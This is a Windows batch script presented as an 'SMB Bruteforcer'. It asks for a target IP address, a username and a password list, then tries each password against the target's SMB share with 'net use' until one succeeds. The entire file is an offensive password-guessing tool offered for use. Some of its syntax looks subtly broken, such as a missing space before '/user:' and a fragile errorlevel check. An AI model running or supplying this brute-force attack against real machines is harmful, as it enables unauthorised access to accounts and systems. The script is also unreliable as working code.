@echo off
title SMB Bruteforcer - By Yassin Nada
color a
echo.
set  /p ip="Enter IP Address:"
set  /p user="Enter Username:"
set  /p wordlist="Enter Password List:"

set /a count=0
for /f %%a in (%wordlist%) do (
echo %%a
set pass=%%a 
call :attempt
)
echo password not found :(
pause 
exit

:success
echo.
echo Password Found!: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip%/user:%user% %pass% >nul 2>&1
echo [attempt %count%]: [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
